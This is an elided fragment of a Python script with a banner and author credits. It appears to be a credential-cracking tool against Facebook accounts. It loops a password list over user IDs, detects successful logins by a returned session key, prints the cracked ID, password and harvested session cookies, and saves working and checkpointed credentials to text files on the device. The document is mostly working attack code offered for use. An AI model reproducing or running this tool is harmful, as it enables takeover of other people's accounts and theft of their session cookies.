#WRITTEN BY MR.DIPTO
#FOLLOW : https://github.com/XD-TOM/Tom
#------------- import -------------#
import os
...
|        \ /      \ |  \     /  \
 \$$$$$$$$|  $$$$$$\| $$\   /  $$
   ...
   | $$    \$$    $$| $$  \$ | $$
    \$$     \$$$$$$  \$$      \$$
{warna}--------------------------------------------{B}
 Owner    : IBNA AHMED TOM
 Guthub   : TOM-XD
 Facebook : Rx Tom Chowdhury 
...
def MR_DIPTO():
    clear()
    os.system('xdg-open https://github.com/XD-TOM/Tom')
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[TOM-XD-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/TOM-XD-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[TOM-XD-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/TOM-XD-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
